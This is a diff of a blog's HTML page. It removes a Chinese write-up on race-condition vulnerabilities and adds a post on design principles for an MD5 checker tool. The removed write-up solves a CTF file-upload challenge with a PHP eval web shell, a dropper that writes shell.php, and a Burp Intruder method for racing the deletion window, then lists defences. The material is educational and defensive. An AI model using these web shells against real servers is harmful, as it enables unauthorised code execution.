@@ -19,27 +19,22 @@
   <meta name="author" content="fishcanf1y">
   <meta name="keywords" content="fishcanf1y">
   
-    <meta name="description" content="Web安全条件竞争漏洞学习0x00 概述​        条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并">
+    <meta name="description" content="后记：在MD5-Checker 项目开发中，我也遇到了很多知识面缺陷的问题，于是在开发过程中我选择使用了AI来辅助开发（学艺不精）在此，我根据AI的建议，梳理了一份思路——如何成为一名合格的Devloper 以下是针对MD5校验工具设计思路所涉及的软件工程原则（以MD5-Checker开发为例）、经典理论以及对应的学习吸收方法的系统化总结：  一、涉及的核心理论与原则1. 模块化设计 SOLID原">
 <meta property="og:type" content="article">
-<meta property="og:title" content="条件竞争漏洞学习">
-<meta property="og:url" content="https://fishcanf1y.github.io/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:title" content="How to design an MD5 verifier - 后记">
+<meta property="og:url" content="https://fishcanf1y.github.io/2025/07/12/verifier-talk/index.html">
 <meta property="og:site_name" content="fishcanf1y">
-<meta property="og:description" content="Web安全条件竞争漏洞学习0x00 概述​        条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并">
+<meta property="og:description" content="后记：在MD5-Checker 项目开发中，我也遇到了很多知识面缺陷的问题，于是在开发过程中我选择使用了AI来辅助开发（学艺不精）在此，我根据AI的建议，梳理了一份思路——如何成为一名合格的Devloper 以下是针对MD5校验工具设计思路所涉及的软件工程原则（以MD5-Checker开发为例）、经典理论以及对应的学习吸收方法的系统化总结：  一、涉及的核心理论与原则1. 模块化设计 SOLID原">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp">
-<meta property="og:image" content="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp">
-<meta property="og:image" content="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp">
-<meta property="article:published_time" content="2025-02-08T09:02:24.000Z">
-<meta property="article:modified_time" content="2025-06-27T12:27:51.612Z">
+<meta property="article:published_time" content="2025-07-12T13:16:23.000Z">
+<meta property="article:modified_time" content="2025-07-12T13:28:49.179Z">
 <meta property="article:author" content="fishcanf1y">
-<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="Coding">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp">
   
   
   
-  <title>条件竞争漏洞学习 - fishcanf1y</title>
+  <title>How to design an MD5 verifier - 后记 - fishcanf1y</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -227,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="条件竞争漏洞学习"></span>
+            <span id="subtitle" data-typed-text="How to design an MD5 verifier - 后记"></span>
           
         </div>
 
@@ -238,8 +233,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-08 17:02" pubdate>
-          February 8, 2025 pm
+        <time datetime="2025-07-12 21:16" pubdate>
+          July 12, 2025 pm
         </time>
       </span>
     
@@ -250,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2k words
+          970 words
         
       </span>
     
@@ -261,7 +256,7 @@
         
         
         
-          17 mins
+          9 mins
         
       </span>
     
@@ -298,131 +293,172 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">条件竞争漏洞学习</h1>
+            <h1 id="seo-header">How to design an MD5 verifier - 后记</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="Web安全条件竞争漏洞学习"><a href="#Web安全条件竞争漏洞学习" class="headerlink" title="Web安全条件竞争漏洞学习"></a>Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h4><p>​        条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p>
-<h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"><a href="#简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作" class="headerlink" title="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"></a>简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><span id="more"></span>
-<h4 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p>
-<p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" srcset="/img/loading.gif" lazyload alt="Lesson-eb3846115f6b8"></p>
-<p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程/多进程）执行的：</p>
-<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> **handle_req**():
-    <span class="hljs-keyword">if</span> code_already_used = <span class="hljs-literal">False</span>: <span class="hljs-comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span>
-        use_code()				  <span class="hljs-comment"># 使用折扣码，对商品进行打折</span>
-        code_already_used = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span>
-    <span class="hljs-keyword">else</span>:						  <span class="hljs-comment"># 若已经使用过折扣码</span>
-        reject_use_code()      	  <span class="hljs-comment"># 拒绝再次使用折扣码</span></code></pre></div>
-<p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p>
-<p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" srcset="/img/loading.gif" lazyload alt="Lesson-eb3846115f6b8"></p>
-<p>　竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p>
-<p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" srcset="/img/loading.gif" lazyload alt="Lesson-eb3846115f6b8"></p>
-<h4 id="0x02-CTF中的条件竞争"><a href="#0x02-CTF中的条件竞争" class="headerlink" title="0x02 CTF中的条件竞争"></a>0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p>
-<p>【题型】<a href>Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list）
-【思路】[条件竞争](">攻防世界</a></p>
-<p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p>
-<div class="code-wrapper"><pre><code class="hljs bash">POST /upload.php HTTP/1.1
-Host: Host:Port
-Content-Length: 230
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://61.147.171.105:56903
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLh
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: Host:Port
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-------WebKitFormBoundaryMwWBoiGSKcfAYxLh
-Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;classic.php&quot;</span>
-Content-Type: application/octet-stream
-
-&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;
-------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</code></pre></div>
-<p>我们把它放到Repeater中放出去看看，查看返回包</p>
-<div class="code-wrapper"><pre><code class="hljs bash">HTTP/1.1 200 OK
-Date: Sat, 08 Feb 2025 09:38:03 GMT
-Server: Apache/2.4.18 (Ubuntu)
-Content-Length: 0
-Connection: close
-Content-Type: text/html; charset=UTF-8</code></pre></div>
-<p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p>
-<p>我们先尝试访问我们上传的一句话并拦截包</p>
-<div class="code-wrapper"><pre><code class="hljs bash">GET /upload/classic.php HTTP/1.1
-Host: 61.147.171.105:56903
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close</code></pre></div>
-<p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p>
-<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div>
-<p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p>
-<p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p>
-<p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" srcset="/img/loading.gif" lazyload alt="4"></p>
-<p>Success to upload！</p>
-<p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p>
-<h4 id="0x03-如何防御？"><a href="#0x03-如何防御？" class="headerlink" title="0x03 如何防御？"></a>0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p>
-<p>(1) 使用同步机制<br>    锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>    信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>    互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>    使用原子操作确保操作的不可分割性。<br>    示例：<br>        数据库中的事务（Transaction）。<br>        编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>    尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>    示例：<br>        使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>    使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>    使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>    减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>    示例：<br>        在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>    使用不可变对象（Immutable Objects）避免共享资源被修改。<br>    示例：<br>        在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>    对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>    示例：<br>        检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>    通过代码审查发现潜在的竞争条件。<br>    使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p>
-<p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p>
-<div class="code-wrapper"><pre><code class="hljs c">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。
-
-防御方法：
-
-    使用原子操作（如 open() 的 O_EXCL 标志）。
-
-    示例（C 语言）：
-    c
-    复制
-
-    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0644</span>);
-    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;
-        <span class="hljs-comment">// 文件已存在</span>
-    &#125;</code></pre></div>
-<p>(2) 文件上传漏洞</p>
-<div class="code-wrapper"><pre><code class="hljs python">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。
-
-防御方法：
-
-    使用临时文件，上传完成后再重命名。
-
-    示例：
-    python
-    复制
-
-    <span class="hljs-keyword">import</span> os
-    <span class="hljs-keyword">import</span> tempfile
-
-    <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> tmp_file:
-        tmp_file.write(<span class="hljs-string">b&quot;file content&quot;</span>)
-        tmp_path = tmp_file.name
-
-    os.rename(tmp_path, <span class="hljs-string">&quot;final_file.txt&quot;</span>)</code></pre></div>
-<p>(3) 并发修改共享变量</p>
-<div class="code-wrapper"><pre><code class="hljs java">漏洞描述：多个线程同时修改共享变量，导致数据不一致。
-
-防御方法：
-
-    使用锁或原子操作。
-
-    示例（Java）：
-    java
-    复制
-
-    <span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;
-
-    <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">sharedResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
-
-    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateResource</span><span class="hljs-params">()</span> &#123;
-        sharedResource.incrementAndGet();
-    &#125;</code></pre></div>
-<h6 id="一些素材来源："><a href="#一些素材来源：" class="headerlink" title="一些素材来源："></a>一些素材来源：</h6><p><a target="_blank" rel="noopener" href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p>
-<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/">DeepSeek</a></p>
+                <h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>在<code>MD5-Checker</code> 项目开发中，我也遇到了很多知识面缺陷的问题，于是在开发过程中我选择使用了AI来辅助开发（学艺不精）在此，我根据AI的建议，梳理了一份思路——如何成为一名合格的Devloper</p>
+<p>以下是针对MD5校验工具设计思路所涉及的软件工程原则（以MD5-Checker开发为例）、经典理论以及对应的学习吸收方法的系统化总结：</p>
+<hr>
+<h3 id="一、涉及的核心理论与原则"><a href="#一、涉及的核心理论与原则" class="headerlink" title="一、涉及的核心理论与原则"></a>一、涉及的核心理论与原则</h3><h4 id="1-模块化设计"><a href="#1-模块化设计" class="headerlink" title="1. 模块化设计"></a>1. <strong>模块化设计</strong></h4><ul>
+<li><strong>SOLID原则</strong>（尤其是单一职责原则）<ul>
+<li>每个函数只做一件事（如<code>calculate_md5</code>仅负责计算）</li>
+<li>参考：《Clean Code》by Robert C. Martin</li>
+</ul>
+</li>
+<li><strong>关注点分离(SoC)</strong><ul>
+<li>CLI解析、业务逻辑、文件操作分层处理</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-性能优化"><a href="#2-性能优化" class="headerlink" title="2. 性能优化"></a>2. <strong>性能优化</strong></h4><ul>
+<li><strong>I/O效率原则</strong><ul>
+<li>分块大小选择（64KB）涉及《操作系统概念》中的磁盘预读策略</li>
+<li>参考：Linux内核的<code>readahead</code>机制</li>
+</ul>
+</li>
+<li><strong>时间/空间权衡</strong><ul>
+<li>内存分块 vs 计算速度的平衡（《算法导论》第17章平摊分析）</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-错误处理"><a href="#3-错误处理" class="headerlink" title="3. 错误处理"></a>3. <strong>错误处理</strong></h4><ul>
+<li><strong>防御式编程</strong><ul>
+<li><code>try/except</code>处理文件操作（《代码大全》第8章）</li>
+</ul>
+</li>
+<li><strong>契约设计</strong><ul>
+<li>函数输入/输出约定（如<code>verify_md5</code>返回布尔值）</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-接口设计"><a href="#4-接口设计" class="headerlink" title="4. 接口设计"></a>4. <strong>接口设计</strong></h4><ul>
+<li><strong>Unix哲学</strong><ul>
+<li>“Do One Thing and Do It Well”（命令行工具设计）</li>
+<li>参考：《The Art of Unix Programming》</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-可扩展性"><a href="#5-可扩展性" class="headerlink" title="5. 可扩展性"></a>5. <strong>可扩展性</strong></h4><ul>
+<li><strong>开放封闭原则(OCP)</strong><ul>
+<li>通过<code>hashlib.new()</code>预留多算法支持</li>
+<li>参考：《设计模式：可复用面向对象软件的基础》</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="二、学习吸收方法论"><a href="#二、学习吸收方法论" class="headerlink" title="二、学习吸收方法论"></a>二、学习吸收方法论</h3><h4 id="1-理论-→-实践循环"><a href="#1-理论-→-实践循环" class="headerlink" title="1. 理论 → 实践循环"></a>1. <strong>理论 → 实践循环</strong></h4><ul>
+<li><strong>步骤</strong>：<ol>
+<li>阅读《Clean Code》函数设计章节 → 重构自己的函数</li>
+<li>研究Linux文件系统预读机制 → 调整<code>block_size</code>测试性能</li>
+<li>学习SOLID原则 → 分析工具中哪些模块符合/违反原则</li>
+</ol>
+</li>
+</ul>
+<h4 id="2-代码考古学"><a href="#2-代码考古学" class="headerlink" title="2. 代码考古学"></a>2. <strong>代码考古学</strong></h4><ul>
+<li><p><strong>经典工具对比学习</strong>：</p>
+<p>bash</p>
+<div class="code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-comment"># 研究GNU coreutils的md5sum实现</span>
+git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>://git.sv.gnu.org/coreutils
+grep -r <span class="hljs-string">&quot;BLOCKSIZE&quot;</span> src/</code></pre></div>
+</li>
+<li><p><strong>Python生态参考</strong>：</p>
+<ul>
+<li>对比<code>hashlib</code>与<code>cryptography</code>库的设计差异</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-量化分析实践"><a href="#3-量化分析实践" class="headerlink" title="3. 量化分析实践"></a>3. <strong>量化分析实践</strong></h4><ul>
+<li><p><strong>性能基准测试</strong>：</p>
+<p>python</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> timeit
+<span class="hljs-attribute">timeit</span>.timeit(&#x27;calculate_md5(<span class="hljs-string">&quot;large_file.iso&quot;</span>, block_size=<span class="hljs-number">8192</span>)&#x27;, number=<span class="hljs-number">10</span>)</code></pre></div>
+</li>
+<li><p><strong>内存分析</strong>：</p>
+<p>bash</p>
+<div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> memory_profiler md5_tool.<span class="hljs-keyword">py</span></code></pre></div>
+</li>
+</ul>
+<h4 id="4-设计模式映射"><a href="#4-设计模式映射" class="headerlink" title="4. 设计模式映射"></a>4. <strong>设计模式映射</strong></h4><ul>
+<li><p><strong>识别模式应用</strong>：</p>
+<p>| 模式     | 本工具实例                    |<br>| :———- | :—————————————— |<br>| 模板方法 | <code>calculate_md5</code>的分块处理流程 |<br>| 工厂方法 | <code>hashlib.md5()</code>构造函数       |<br>| 命令模式 | argparse子命令实现            |</p>
+</li>
+</ul>
+<h4 id="5-刻意练习路线"><a href="#5-刻意练习路线" class="headerlink" title="5. 刻意练习路线"></a>5. <strong>刻意练习路线</strong></h4><ol>
+<li><strong>基础阶段</strong>：<ul>
+<li>实现单文件MD5计算（理解分块哈希）</li>
+<li>添加单元测试（文件不存在、空文件等case）</li>
+</ul>
+</li>
+<li><strong>进阶阶段</strong>：<ul>
+<li>增加SHA-256支持（实践开放封闭原则）</li>
+<li>实现多线程批量计算（学习GIL限制）</li>
+</ul>
+</li>
+<li><strong>高级阶段</strong>：<ul>
+<li>开发VS Code插件调用该工具（接口设计实践）</li>
+<li>用Rust重写性能关键部分（FFI交互学习）</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="三、推荐学习资源"><a href="#三、推荐学习资源" class="headerlink" title="三、推荐学习资源"></a>三、推荐学习资源</h3><h4 id="1-必读经典"><a href="#1-必读经典" class="headerlink" title="1. 必读经典"></a>1. <strong>必读经典</strong></h4><ul>
+<li>《代码大全》第5章（设计）、第8章（防御式编程）</li>
+<li>《Unix编程艺术》第1章（模块化）、第7章（接口设计）</li>
+</ul>
+<h4 id="2-论文参考"><a href="#2-论文参考" class="headerlink" title="2. 论文参考"></a>2. <strong>论文参考</strong></h4><ul>
+<li><em>The MD5 Message-Digest Algorithm</em> (RFC 1321)</li>
+<li><em>A Quantitative Study of File Systems’ Block Size Selection</em> (FAST’13)</li>
+</ul>
+<h4 id="3-实践项目"><a href="#3-实践项目" class="headerlink" title="3. 实践项目"></a>3. <strong>实践项目</strong></h4><ul>
+<li>GNU coreutils源码（md5sum实现）</li>
+<li>Python标准库<code>hashlib</code>的C实现（<code>_hashlib.c</code>）</li>
+</ul>
+<h4 id="4-可视化学习"><a href="#4-可视化学习" class="headerlink" title="4. 可视化学习"></a>4. <strong>可视化学习</strong></h4><ul>
+<li>MD5算法可视化：<a target="_blank" rel="noopener" href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">https://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a></li>
+<li>I/O缓冲区交互演示：<a target="_blank" rel="noopener" href="https://www.linuxatemyram.com/">https://www.linuxatemyram.com/</a></li>
+</ul>
+<hr>
+<h3 id="四、知识吸收检查表"><a href="#四、知识吸收检查表" class="headerlink" title="四、知识吸收检查表"></a>四、知识吸收检查表</h3><p>当你认为自己已掌握某个概念时，尝试回答：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">检查项</th>
+<th style="text-align:left">是/否</th>
+<th style="text-align:left">示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">能解释64KB块大小的选择依据？</td>
+<td style="text-align:left">✓</td>
+<td style="text-align:left">磁盘扇区对齐、内存页大小</td>
+</tr>
+<tr>
+<td style="text-align:left">能画出数据流图？</td>
+<td style="text-align:left">✓</td>
+<td style="text-align:left">文件→分块→哈希更新→hexdigest</td>
+</tr>
+<tr>
+<td style="text-align:left">能列举3种替代设计方案？</td>
+<td style="text-align:left">✓</td>
+<td style="text-align:left">mmap映射、内存视图、GPU加速</td>
+</tr>
+<tr>
+<td style="text-align:left">能说明异常处理的设计取舍？</td>
+<td style="text-align:left">✓</td>
+<td style="text-align:left">返回None vs 抛出异常</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
+<p>通过这种结构化学习路径，你可以将工具开发经验转化为可迁移的软件工程能力，逐步构建自己的系统设计思维体系。</p>
+<p>上了个置顶，遍笔者和各位朋友慢慢消化吸收</p>
+<script src="https://giscus.app/client.js" data-repo="fishcanf1y/fishcanf1y.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async>
+</script>
 
                 
               </div>
@@ -441,7 +477,7 @@ Connection: close</code></pre></div>
     
       <span class="category-chain">
         
-  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  <a href="/categories/Coding/" class="category-chain-item">Coding</a>
   
   
 
@@ -456,7 +492,7 @@ Connection: close</code></pre></div>
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+        <a href="/tags/Coding/" class="print-no-link">#Coding</a>
       
     </div>
   
@@ -468,8 +504,8 @@ Connection: close</code></pre></div>
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>条件竞争漏洞学习</div>
-      <div>https://fishcanf1y.github.io/2025/02/08/条件竞争漏洞学习/</div>
+      <div>How to design an MD5 verifier - 后记</div>
+      <div>https://fishcanf1y.github.io/2025/07/12/verifier-talk/</div>
     </div>
     <div class="license-meta">
       
@@ -481,7 +517,7 @@ Connection: close</code></pre></div>
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>February 8, 2025</div>
+          <div>July 12, 2025</div>
         </div>
       
       
@@ -513,9 +549,9 @@ Connection: close</code></pre></div>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/19/Basic-ROP-Learning/" title="Basic ROP Learning">
+                      <a href="/2025/07/12/%E5%85%B3%E4%BA%8EPython%E6%89%93%E5%8C%85%E6%88%90EXE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" title="关于Python打包成EXE的那些事">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Basic ROP Learning</span>
+                        <span class="hidden-mobile">关于Python打包成EXE的那些事</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -523,8 +559,8 @@ Connection: close</code></pre></div>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/" title="攻防世界-pwnstack题解">
-                        <span class="hidden-mobile">攻防世界-pwnstack题解</span>
+                      <a href="/2025/07/12/P1149-Matchstick/" title="P1149 [NOIP 2008 提高组] 火柴棒等式">
+                        <span class="hidden-mobile">P1149 [NOIP 2008 提高组] 火柴棒等式</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
